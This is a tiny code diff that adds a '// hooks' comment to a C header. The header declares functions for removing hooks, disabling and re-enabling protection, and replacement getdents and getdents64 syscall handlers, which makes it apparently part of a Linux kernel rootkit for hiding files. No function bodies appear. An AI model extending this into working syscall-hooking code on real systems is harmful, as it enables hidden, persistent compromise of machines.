@@ -23,7 +23,7 @@ void remove_hooks(void);
 void disable_protection(void);
 void enable_protection(void);
 
-
+// hooks
 asmlinkage long g7_getdents(const struct pt_regs *);
 asmlinkage long g7_getdents64(const struct pt_regs *);
 
